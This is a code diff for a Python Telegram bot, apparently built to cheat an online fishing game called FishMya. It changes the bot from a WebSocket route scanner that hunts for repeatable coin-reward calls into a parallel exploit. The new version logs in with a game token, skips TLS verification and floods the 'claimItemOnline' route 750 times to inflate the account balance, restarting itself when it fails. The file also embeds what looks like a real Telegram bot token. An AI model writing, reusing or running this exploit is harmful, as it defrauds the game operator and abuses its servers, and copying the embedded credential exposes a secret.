@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
-FishMya Game - WebSocket Route Auto Scanner + Exploit Finder
+FishMya Game - Multi-Route Parallel Exploit
 Author: GHOST
-Version: 11.0 - Auto Route Scanner
+Version: 12.0 - 5 Routes Parallel Exploit
 """
 
 import asyncio
@@ -17,6 +17,7 @@ import msgpack
 import ssl
 import websocket
 import threading
+from concurrent.futures import ThreadPoolExecutor
 
 # ==================== CONFIGURATION ====================
 TELEGRAM_BOT_TOKEN = "8801207672:AAEsJfwy12ePwpjvDNalCeIrYQl-91vgMMk"
@@ -41,114 +42,40 @@ logger = logging.getLogger(__name__)
 TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
 last_update_id = 0
 
-# ==================== SCANNER STATE ====================
-scanner_state = {
-    'scanning': False,
-    'scan_results': [],
-    'found_routes': {},
-    'coin_routes': [],
-    'repeatable_routes': [],
-    'total_found': 0,
-    'scan_complete': False
+# ==================== EXPLOIT CONFIG ====================
+EXPLOIT_ROUTES = [
+    {"route": "claimItemOnline", "package": 1, "coins": 300},
+    {"route": "claimItemOnline", "package": 2, "coins": 500},
+    {"route": "claimItemOnline", "package": 3, "coins": 800},
+    {"route": "claimItemOnline", "package": 4, "coins": 1000},
+    {"route": "claimItemOnline", "package": 5, "coins": 1500},
+]
+
+CLAIMS_PER_ROUTE = 150  # တစ်ခုကို 150 ကြိမ်
+TOTAL_CLAIMS = len(EXPLOIT_ROUTES) * CLAIMS_PER_ROUTE  # 750 total
+
+# ==================== STATE ====================
+exploit_state = {
+    'is_running': False,
+    'total_claimed': 0,
+    'current_balance': 0,
+    'start_balance': 0,
+    'claims_done': 0,
+    'total_claims': TOTAL_CLAIMS,
+    'errors': 0,
+    'last_error': 'None',
+    'start_time': None,
+    'last_update_time': None,
+    'route_stats': {
+        1: {'sent': 0, 'received': 0, 'coins': 0},
+        2: {'sent': 0, 'received': 0, 'coins': 0},
+        3: {'sent': 0, 'received': 0, 'coins': 0},
+        4: {'sent': 0, 'received': 0, 'coins': 0},
+        5: {'sent': 0, 'received': 0, 'coins': 0},
+    }
 }
 
-# ==================== ROUTES TO TEST ====================
-# ဒီ route တွေကို auto test လုပ်မယ်
-TEST_ROUTES = [
-    # Claim routes
-    {"route": "claimItemOnline", "data": {"package": 1}},
-    {"route": "claimItemOnline", "data": {"package": 2}},
-    {"route": "claimItemOnline", "data": {"package": 3}},
-    {"route": "claimItemOnline", "data": {"package": 4}},
-    {"route": "claimItemOnline", "data": {"package": 5}},
-    {"route": "claimItemOnline", "data": {"package": 6}},
-    {"route": "claimItemOnline", "data": {"package": 7}},
-    {"route": "claimItemOnline", "data": {"package": 8}},
-    {"route": "claimItemOnline", "data": {"package": 9}},
-    {"route": "claimItemOnline", "data": {"package": 10}},
-    
-    # Daily rewards
-    {"route": "claimDaily", "data": {}},
-    {"route": "claimDailyReward", "data": {}},
-    {"route": "dailyClaim", "data": {}},
-    {"route": "claimLogin", "data": {}},
-    {"route": "loginReward", "data": {}},
-    {"route": "dailyBonus", "data": {}},
-    {"route": "checkin", "data": {}},
-    {"route": "dailyCheckin", "data": {}},
-    
-    # Gift routes
-    {"route": "claimGift", "data": {}},
-    {"route": "openGift", "data": {}},
-    {"route": "receiveGift", "data": {}},
-    {"route": "giftBox", "data": {}},
-    {"route": "openBox", "data": {}},
-    {"route": "claimBox", "data": {}},
-    
-    # Reward routes
-    {"route": "claimReward", "data": {}},
-    {"route": "getReward", "data": {}},
-    {"route": "receiveReward", "data": {}},
-    {"route": "claimBonus", "data": {}},
-    {"route": "getBonus", "data": {}},
-    {"route": "bonusReward", "data": {}},
-    
-    # Lucky wheel
-    {"route": "spinLucky", "data": {}},
-    {"route": "luckySpin", "data": {}},
-    {"route": "spinWheel", "data": {}},
-    {"route": "wheelSpin", "data": {}},
-    
-    # Item routes
-    {"route": "claimItem", "data": {}},
-    {"route": "useItem", "data": {"type": 1}},
-    {"route": "useItem", "data": {"type": 2}},
-    {"route": "useItem", "data": {"type": 3}},
-    {"route": "useItem", "data": {"type": 4}},
-    {"route": "useItem", "data": {"type": 5}},
-    {"route": "useItem", "data": {"type": 6}},
-    
-    # Mission routes
-    {"route": "claimMission", "data": {}},
-    {"route": "missionReward", "data": {}},
-    {"route": "completeMission", "data": {}},
-    {"route": "taskReward", "data": {}},
-    {"route": "claimTask", "data": {}},
-    {"route": "questReward", "data": {}},
-    
-    # Level routes
-    {"route": "levelReward", "data": {}},
-    {"route": "levelUpReward", "data": {}},
-    {"route": "claimLevel", "data": {}},
-    
-    # Event routes
-    {"route": "eventReward", "data": {}},
-    {"route": "claimEvent", "data": {}},
-    {"route": "eventBonus", "data": {}},
-    
-    # Online rewards
-    {"route": "onlineReward", "data": {}},
-    {"route": "onlineBonus", "data": {}},
-    {"route": "timeReward", "data": {}},
-    {"route": "hourlyReward", "data": {}},
-    
-    # Fish routes
-    {"route": "catchFish", "data": {}},
-    {"route": "fishReward", "data": {}},
-    {"route": "claimFish", "data": {}},
-    
-    # Exchange routes
-    {"route": "exchange", "data": {}},
-    {"route": "exchangeItem", "data": {}},
-    {"route": "convert", "data": {}},
-    
-    # Other
-    {"route": "getBalance", "data": {}},
-    {"route": "refreshCash", "data": {}},
-    {"route": "syncCash", "data": {}},
-    {"route": "updateCash", "data": {}},
-    {"route": "reloadCash", "data": {}},
-]
+state_lock = threading.Lock()
 
 # ==================== UTILS ====================
 async def send_telegram(chat_id: str, text: str):
@@ -188,337 +115,180 @@ async def get_updates(offset: int = 0) -> List[Dict]:
     
     return []
 
-# ==================== ROUTE SCANNER ====================
-def extract_coin_from_message(decoded: Dict) -> int:
-    """Extract coin amount from any WebSocket message"""
-    if not decoded:
-        return 0
+# ==================== EXPLOIT ENGINE ====================
+def exploit_loop(chat_id: str):
+    """Main exploit loop - 5 routes parallel"""
+    global exploit_state
     
-    coin_keys = [
-        'cash', 'coin', 'coins', 'gold', 'golds', 'reward', 'rewards',
-        'amount', 'changeCash', 'newCash', 'balance', 'bonus', 'gift',
-        'point', 'points', 'money', 'currency', 'diamond', 'diamonds',
-        'gem', 'gems', 'totalCash', 'addCash', 'earnCash', 'winCash'
-    ]
+    exploit_state['is_running'] = True
+    exploit_state['total_claimed'] = 0
+    exploit_state['claims_done'] = 0
+    exploit_state['errors'] = 0
+    exploit_state['start_time'] = datetime.now()
     
-    def search(obj, depth=0):
-        if depth > 10:
-            return 0
-        if isinstance(obj, dict):
-            for key, value in obj.items():
-                key_lower = key.lower()
-                if any(k in key_lower for k in coin_keys):
-                    if isinstance(value, (int, float)) and value > 0:
-                        return int(value)
-                    elif isinstance(value, str) and value.isdigit() and int(value) > 0:
-                        return int(value)
-                result = search(value, depth + 1)
-                if result > 0:
-                    return result
-        elif isinstance(obj, list):
-            for item in obj:
-                result = search(item, depth + 1)
-                if result > 0:
-                    return result
-        return 0
+    logger.info(f"🚀 Starting parallel exploit: {len(EXPLOIT_ROUTES)} routes x {CLAIMS_PER_ROUTE} claims")
     
-    return search(decoded)
-
-def scan_routes_sync(chat_id: str):
-    """Scan all routes for coin rewards"""
-    global scanner_state
+    asyncio.run(send_telegram(
+        chat_id,
+        f"🚀 *Parallel Exploit Started!*\n\n"
+        f"📍 Routes: {len(EXPLOIT_ROUTES)}\n"
+        f"📦 Claims per Route: {CLAIMS_PER_ROUTE}\n"
+        f"🔢 Total Claims: {TOTAL_CLAIMS}\n\n"
+        f"💡 Use /status to check progress"
+    ))
     
-    scanner_state['scanning'] = True
-    scanner_state['scan_results'] = []
-    scanner_state['found_routes'] = {}
-    scanner_state['coin_routes'] = []
-    scanner_state['repeatable_routes'] = []
-    scanner_state['scan_complete'] = False
-    
-    logger.info(f"🔍 Starting route scan: {len(TEST_ROUTES)} routes to test")
-    
-    # Connect WebSocket
-    try:
-        ws = websocket.create_connection(
-            WS_URL,
-            sslopt={"cert_reqs": ssl.CERT_NONE},
-            header=[f"{k}: {v}" for k, v in WS_HEADERS.items()],
-            timeout=30
-        )
-        
-        # Login
-        login_payload = {
-            "route": "mytelLogin",
-            "data": {"accessToken": GAME_ACCESS_TOKEN, "language": "my"},
-            "msgId": 1
-        }
-        ws.send(msgpack.packb(login_payload, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
-        
-        # Wait for login
-        ws.settimeout(10)
-        login_ok = False
-        for _ in range(10):
-            try:
-                m = ws.recv()
-                d = msgpack.unpackb(m, raw=False)
-                if d.get("msgId") == 1 and d.get("data", {}).get("ok"):
-                    login_ok = True
-                    balance = d.get("data", {}).get("cash", 0)
-                    logger.info(f"✅ Login OK! Balance: {balance:,}")
-                    asyncio.run(send_telegram(chat_id, f"✅ *Login OK!*\n💰 Balance: {balance:,}\n\n🔍 Starting route scan..."))
-                    break
-            except:
-                break
-        
-        if not login_ok:
-            logger.error("❌ Login failed during scan")
-            asyncio.run(send_telegram(chat_id, "❌ *Login Failed!*"))
-            ws.close()
-            scanner_state['scanning'] = False
-            return
-        
-        # Enter room
-        ws.send(msgpack.packb({"route": "play", "data": {"roomId": 1}, "msgId": 2}, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
-        time.sleep(1)
-        
-        # Test each route
-        msg_id = 1000
-        
-        for i, test_route in enumerate(TEST_ROUTES):
-            route_name = test_route['route']
-            route_data = test_route['data']
+    while exploit_state['is_running']:
+        try:
+            # Connect WebSocket
+            ws = websocket.create_connection(
+                WS_URL,
+                sslopt={"cert_reqs": ssl.CERT_NONE},
+                header=[f"{k}: {v}" for k, v in WS_HEADERS.items()],
+                timeout=30
+            )
             
-            # Send test route
+            # Login
             ws.send(msgpack.packb({
-                "route": route_name,
-                "data": route_data,
-                "msgId": msg_id
+                "route": "mytelLogin",
+                "data": {"accessToken": GAME_ACCESS_TOKEN, "language": "my"},
+                "msgId": 1
             }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
             
-            # Wait for response
-            ws.settimeout(1.0)
-            coins_found = 0
-            response_received = False
+            # Wait for login
+            ws.settimeout(10)
+            login_ok = False
             
-            try:
-                while True:
+            for _ in range(20):
+                try:
                     m = ws.recv()
                     d = msgpack.unpackb(m, raw=False)
-                    
-                    # Check if response to our message
-                    if d.get("msgId") == msg_id:
-                        response_received = True
-                        coins_found = extract_coin_from_message(d)
-                        if coins_found > 0:
-                            break
-                    
-                    # Check for cash updates
-                    if d.get("route") == "reloadCash":
-                        change = d.get("data", {}).get("changeCash", 0)
-                        if change > 0:
-                            coins_found = change
-                            break
-                    
-                    # Check other coin routes
-                    coins = extract_coin_from_message(d)
-                    if coins > 0 and response_received:
-                        coins_found = coins
+                    if d.get("msgId") == 1 and d.get("data", {}).get("ok"):
+                        login_ok = True
+                        exploit_state['start_balance'] = d.get("data", {}).get("cash", 0)
+                        exploit_state['current_balance'] = exploit_state['start_balance']
+                        logger.info(f"✅ Login OK! Balance: {exploit_state['start_balance']:,}")
                         break
+                except:
+                    break
             
-            except websocket.WebSocketTimeoutException:
-                pass
-            except:
-                pass
+            if not login_ok:
+                logger.error("❌ Login failed, retrying...")
+                ws.close()
+                time.sleep(3)
+                continue
             
-            msg_id += 1
+            # Enter room
+            ws.send(msgpack.packb({
+                "route": "play",
+                "data": {"roomId": 1},
+                "msgId": 2
+            }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
+            time.sleep(1)
             
-            if coins_found > 0:
-                result = {
-                    'route': route_name,
-                    'data': route_data,
-                    'coin_amount': coins_found,
-                    'msg_id': msg_id - 1
-                }
-                scanner_state['scan_results'].append(result)
-                scanner_state['coin_routes'].append(result)
+            # Start parallel sending
+            msg_id_base = 10000
+            messages_sent = 0
+            last_progress_time = time.time()
+            
+            # Send all 5 routes simultaneously in batches
+            for claim_index in range(CLAIMS_PER_ROUTE):
+                if not exploit_state['is_running']:
+                    break
                 
-                logger.info(f"✅ [{i+1}/{len(TEST_ROUTES)}] {route_name} - {coins_found} coins!")
+                # Send all 5 routes at once (parallel)
+                for route_info in EXPLOIT_ROUTES:
+                    package = route_info['package']
+                    
+                    ws.send(msgpack.packb({
+                        "route": "claimItemOnline",
+                        "data": {"package": package},
+                        "msgId": msg_id_base
+                    }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
+                    
+                    msg_id_base += 1
+                    messages_sent += 1
+                    
+                    with state_lock:
+                        exploit_state['route_stats'][package]['sent'] += 1
                 
-                # Test repeatability
-                ws.send(msgpack.packb({
-                    "route": route_name,
-                    "data": route_data,
-                    "msgId": msg_id
-                }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
-                
-                ws.settimeout(1.0)
-                repeat_coins = 0
+                # Receive responses
+                ws.settimeout(0.5)
                 try:
                     while True:
                         m = ws.recv()
                         d = msgpack.unpackb(m, raw=False)
                         
-                        if d.get("msgId") == msg_id:
-                            repeat_coins = extract_coin_from_message(d)
-                            if repeat_coins > 0:
-                                break
+                        route = d.get("route", "")
+                        inner = d.get("data", {})
                         
-                        if d.get("route") == "reloadCash":
-                            change = d.get("data", {}).get("changeCash", 0)
+                        if route == "reloadCash":
+                            change = inner.get("changeCash", 0)
                             if change > 0:
-                                repeat_coins = change
-                                break
+                                with state_lock:
+                                    exploit_state['total_claimed'] += change
+                                    exploit_state['current_balance'] = inner.get("newCash", exploit_state['current_balance'])
+                                    exploit_state['claims_done'] += 1
+                                
+                                # Determine which package this belongs to
+                                # (approximate by coin amount)
+                                for ri in EXPLOIT_ROUTES:
+                                    if abs(change - ri['coins']) <= 50:
+                                        with state_lock:
+                                            exploit_state['route_stats'][ri['package']]['received'] += 1
+                                            exploit_state['route_stats'][ri['package']]['coins'] += change
+                                        break
                 
+                except websocket.WebSocketTimeoutException:
+                    pass
                 except:
                     pass
                 
-                msg_id += 1
+                # Update status every 5 seconds (not every claim)
+                current_time = time.time()
+                if current_time - last_progress_time >= 5:
+                    last_progress_time = current_time
+                    
+                    with state_lock:
+                        progress = (exploit_state['claims_done'] / TOTAL_CLAIMS) * 100
+                        logger.info(
+                            f"📊 Progress: {progress:.1f}% | "
+                            f"Claims: {exploit_state['claims_done']}/{TOTAL_CLAIMS} | "
+                            f"Gained: {exploit_state['total_claimed']:,}"
+                        )
                 
-                if repeat_coins > 0:
-                    result['repeatable'] = True
-                    scanner_state['repeatable_routes'].append(result)
-                    logger.info(f"🔄 REPEATABLE: {route_name} - {repeat_coins} coins again!")
-                else:
-                    result['repeatable'] = False
-            else:
-                logger.debug(f"❌ [{i+1}/{len(TEST_ROUTES)}] {route_name} - No coins")
+                # Small delay to avoid overwhelming
+                time.sleep(0.01)
             
-            time.sleep(0.1)
-        
-        ws.close()
-        
-        # Generate report
-        scanner_state['scan_complete'] = True
-        scanner_state['total_found'] = len(scanner_state['coin_routes'])
-        
-        # Send report
-        report = (
-            f"📊 *Route Scan Complete!*\n\n"
-            f"🔍 Routes Tested: {len(TEST_ROUTES)}\n"
-            f"✅ Coin Routes Found: {len(scanner_state['coin_routes'])}\n"
-            f"🔄 Repeatable: {len(scanner_state['repeatable_routes'])}\n"
-        )
-        
-        if scanner_state['repeatable_routes']:
-            report += "\n🎯 *REPEATABLE ROUTES (JACKPOT!):*\n"
-            for r in scanner_state['repeatable_routes'][:10]:
-                report += f"📍 `{r['route']}` - {r['coin_amount']:,} coins\n"
-        
-        if scanner_state['coin_routes']:
-            report += "\n✅ *ALL COIN ROUTES:*\n"
-            for r in scanner_state['coin_routes'][:20]:
-                report += f"📍 `{r['route']}` - {r['coin_amount']:,} coins\n"
-        
-        asyncio.run(send_telegram(chat_id, report))
-        
-        # Auto-exploit repeatable routes
-        if scanner_state['repeatable_routes']:
-            asyncio.run(send_telegram(chat_id, "⛏️ *Starting Auto-Exploit on repeatable routes...*"))
-            exploit_repeatable_routes(chat_id, scanner_state['repeatable_routes'])
-    
-    except Exception as e:
-        logger.error(f"Scan error: {e}")
-        scanner_state['scan_complete'] = True
-        asyncio.run(send_telegram(chat_id, f"❌ *Scan Error:* {str(e)}"))
-    
-    scanner_state['scanning'] = False
-
-def exploit_repeatable_routes(chat_id: str, routes: List[Dict], times: int = 100):
-    """Exploit repeatable routes for coins"""
-    global scanner_state
-    
-    total_claimed = 0
-    
-    try:
-        ws = websocket.create_connection(
-            WS_URL,
-            sslopt={"cert_reqs": ssl.CERT_NONE},
-            header=[f"{k}: {v}" for k, v in WS_HEADERS.items()],
-            timeout=30
-        )
-        
-        # Login
-        ws.send(msgpack.packb({
-            "route": "mytelLogin",
-            "data": {"accessToken": GAME_ACCESS_TOKEN, "language": "my"},
-            "msgId": 1
-        }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
-        
-        ws.settimeout(5)
-        for _ in range(10):
-            m = ws.recv()
-            d = msgpack.unpackb(m, raw=False)
-            if d.get("msgId") == 1:
-                break
-        
-        # Enter room
-        ws.send(msgpack.packb({"route": "play", "data": {"roomId": 1}, "msgId": 2}, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
-        time.sleep(1)
-        
-        msg_id = 5000
-        
-        for route_info in routes:
-            route_name = route_info['route']
-            route_data = route_info['data']
+            ws.close()
+            logger.info("✅ Connection cycle completed")
             
-            logger.info(f"⛏️ Exploiting {route_name}...")
-            
-            for i in range(times):
-                ws.send(msgpack.packb({
-                    "route": route_name,
-                    "data": route_data,
-                    "msgId": msg_id
-                }, use_bin_type=True), opcode=websocket.ABNF.OPCODE_BINARY)
-                
-                ws.settimeout(1.0)
-                try:
-                    while True:
-                        m = ws.recv()
-                        d = msgpack.unpackb(m, raw=False)
-                        
-                        if d.get("route") == "reloadCash":
-                            change = d.get("data", {}).get("changeCash", 0)
-                            if change > 0:
-                                total_claimed += change
-                                scanner_state['total_found'] += change
-                                logger.info(f"💰 +{change:,} (Total: {total_claimed:,})")
-                                break
-                        
-                        if d.get("msgId") == msg_id:
-                            coins = extract_coin_from_message(d)
-                            if coins > 0:
-                                total_claimed += coins
-                                scanner_state['total_found'] += coins
-                                logger.info(f"💰 +{coins:,} (Total: {total_claimed:,})")
-                            break
-                
-                except:
-                    break
-                
-                msg_id += 1
-                
-                if i % 20 == 0 and i > 0:
+            # Check if all claims done
+            with state_lock:
+                if exploit_state['claims_done'] >= TOTAL_CLAIMS:
+                    logger.info("🎉 All claims completed!")
                     asyncio.run(send_telegram(
                         chat_id,
-                        f"📈 *Exploit Progress*\n"
-                        f"📍 Route: `{route_name}`\n"
-                        f"📦 Claims: {i}\n"
-                        f"💰 Total Gained: {total_claimed:,}"
+                        f"🎉 *Exploit Complete!*\n\n"
+                        f"📦 Total Claims: {exploit_state['claims_done']:,}\n"
+                        f"💰 Total Gained: {exploit_state['total_claimed']:,}\n"
+                        f"💎 Final Balance: {exploit_state['current_balance']:,}"
                     ))
-                
-                time.sleep(0.01)
+                    exploit_state['is_running'] = False
+                    break
         
-        ws.close()
-        
-        asyncio.run(send_telegram(
-            chat_id,
-            f"✅ *Exploit Complete!*\n\n"
-            f"💰 Total Claimed: {total_claimed:,} coins"
-        ))
+        except Exception as e:
+            logger.error(f"❌ Exploit error: {e}")
+            with state_lock:
+                exploit_state['errors'] += 1
+                exploit_state['last_error'] = str(e)
+            
+            # Auto restart immediately
+            logger.info("🔄 Auto restarting in 2 seconds...")
+            time.sleep(2)
+            continue
     
-    except Exception as e:
-        logger.error(f"Exploit error: {e}")
-        asyncio.run(send_telegram(chat_id, f"❌ *Exploit Error:* {str(e)}"))
+    exploit_state['is_running'] = False
+    logger.info("Exploit loop ended")
 
 # ==================== COMMANDS ====================
 async def process_command(chat_id: str, command: str):
@@ -527,69 +297,88 @@ async def process_command(chat_id: str, command: str):
     
     if command in ['/start', '/help', '1']:
         help_text = (
-            "🔍 *FishMya Route Auto Scanner*\n\n"
-            "ဒီ bot က game ရဲ့ WebSocket routes တွေကို auto scan လုပ်ပြီး:\n"
-            "1️⃣ Coin ပေးတဲ့ routes တွေ ရှာမယ်\n"
-            "2️⃣ Repeatable routes တွေ့ရင် auto exploit လုပ်မယ်\n"
-            "3️⃣ နောက်ထပ် နည်းလမ်းအသစ်တွေ ရှာမယ်\n\n"
+            "⚡ *Parallel Exploit Bot*\n\n"
+            "5 Routes တစ်ပြိုင်တည်း:\n"
+            "📍 Package 1: 300 coins\n"
+            "📍 Package 2: 500 coins\n"
+            "📍 Package 3: 800 coins\n"
+            "📍 Package 4: 1,000 coins\n"
+            "📍 Package 5: 1,500 coins\n\n"
+            "📦 Per Route: 150 claims\n"
+            "🔢 Total: 750 claims\n\n"
             "📋 *Commands:*\n"
-            "🔹 `/scan` - Route scan စတင်ရန်\n"
-            "🔹 `/exploit` - တွေ့ထားတဲ့ routes တွေကို exploit လုပ်ရန်\n"
-            "🔹 `/status` - Scan status ကြည့်ရန်\n"
-            "🔹 `/stop` - ရပ်ရန်\n\n"
+            "🔹 `/start` - Exploit စတင်ရန်\n"
+            "🔹 `/stop` - ရပ်ရန်\n"
+            "🔹 `/status` - Progress ကြည့်ရန်\n\n"
             "⚡ *Powered by GHOST AI*"
         )
         await send_telegram(chat_id, help_text)
     
-    elif command in ['/scan', '/search', '/mine']:
-        if scanner_state['scanning']:
-            await send_telegram(chat_id, "⚠️ *Scan already running!*")
+    elif command in ['/start', '/run', '/exploit', '/mine']:
+        if exploit_state['is_running']:
+            await send_telegram(chat_id, "⚠️ *Already running!* Use /status to check progress.")
             return
         
-        await send_telegram(chat_id, "🔍 *Starting Route Scan...*\n\nTesting routes for coin rewards...")
-        
-        # Run scan in thread
-        loop = asyncio.get_event_loop()
-        await loop.run_in_executor(None, scan_routes_sync, chat_id)
-    
-    elif command in ['/exploit', '/claim']:
-        if scanner_state['repeatable_routes']:
-            await send_telegram(chat_id, "⛏️ *Starting Auto-Exploit...*")
-            loop = asyncio.get_event_loop()
-            await loop.run_in_executor(None, exploit_repeatable_routes, chat_id, scanner_state['repeatable_routes'], 100)
-        else:
-            await send_telegram(chat_id, "❌ No repeatable routes found. Run /scan first.")
-    
-    elif command in ['/status', '/info']:
-        status = "🟢 Scanning" if scanner_state['scanning'] else "🔴 Idle"
-        await send_telegram(
-            chat_id,
-            f"📊 *Scanner Status*\n\n"
-            f"State: {status}\n"
-            f"✅ Routes Found: {len(scanner_state['coin_routes'])}\n"
-            f"🔄 Repeatable: {len(scanner_state['repeatable_routes'])}\n"
-            f"💰 Total Found: {scanner_state['total_found']:,}\n"
-            f"📋 Scan Complete: {'Yes' if scanner_state['scan_complete'] else 'No'}"
-        )
+        # Start exploit in thread
+        thread = threading.Thread(target=exploit_loop, args=(chat_id,), daemon=True)
+        thread.start()
     
     elif command in ['/stop', '/end']:
-        scanner_state['scanning'] = False
-        await send_telegram(chat_id, "🛑 *Scanner Stopped!*")
+        exploit_state['is_running'] = False
+        await send_telegram(
+            chat_id,
+            f"🛑 *Stopped!*\n\n"
+            f"💰 Total Gained: {exploit_state['total_claimed']:,}\n"
+            f"📦 Claims Done: {exploit_state['claims_done']:,}"
+        )
+    
+    elif command in ['/status', '/info']:
+        with state_lock:
+            status = "🟢 Running" if exploit_state['is_running'] else "🔴 Stopped"
+            progress = 0
+            if exploit_state['total_claims'] > 0:
+                progress = (exploit_state['claims_done'] / exploit_state['total_claims']) * 100
+            
+            status_text = (
+                f"📊 *Exploit Status*\n\n"
+                f"State: {status}\n"
+                f"Progress: {progress:.1f}%\n"
+                f"📦 Claims: {exploit_state['claims_done']:,}/{exploit_state['total_claims']:,}\n"
+                f"💰 Start Balance: {exploit_state['start_balance']:,}\n"
+                f"💎 Current Balance: {exploit_state['current_balance']:,}\n"
+                f"📈 Total Gained: +{exploit_state['total_claimed']:,}\n"
+                f"⚠️ Errors: {exploit_state['errors']}\n"
+                f"🕐 Running: {datetime.now().strftime('%H:%M:%S')}"
+            )
+            
+            # Route details
+            status_text += "\n\n*Route Details:*\n"
+            for ri in EXPLOIT_ROUTES:
+                pkg = ri['package']
+                rs = exploit_state['route_stats'][pkg]
+                status_text += (
+                    f"📍 Pkg {pkg}: {rs['sent']} sent, "
+                    f"{rs['received']} recv, "
+                    f"{rs['coins']:,} coins\n"
+                )
+        
+        await send_telegram(chat_id, status_text)
 
 # ==================== MAIN ====================
 async def main():
     global last_update_id
     
     print("\n" + "=" * 60)
-    print("🔍 FishMya Route Auto Scanner")
+    print("⚡ FishMya Parallel Exploit Bot")
     print(f"⏰ Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
     print(f"🔑 Token: {'✅ Set' if GAME_ACCESS_TOKEN else '❌ Not set'}")
-    print(f"📡 WS: {WS_URL}")
-    print(f"📋 Routes to Test: {len(TEST_ROUTES)}")
+    print(f"📍 Routes: {len(EXPLOIT_ROUTES)}")
+    print(f"📦 Per Route: {CLAIMS_PER_ROUTE}")
+    print(f"🔢 Total: {TOTAL_CLAIMS}")
     print("=" * 60 + "\n")
     
     logger.info("🤖 Bot polling...")
-    logger.info("💡 Send /scan to start route scanning!")
+    logger.info("💡 Send /start to begin exploit!")
     
     while True:
         try:
@@ -613,6 +402,7 @@ async def main():
             await asyncio.sleep(2)
             
         except KeyboardInterrupt:
+            exploit_state['is_running'] = False
             break
         except Exception as e:
             logger.error(f"Error: {e}")
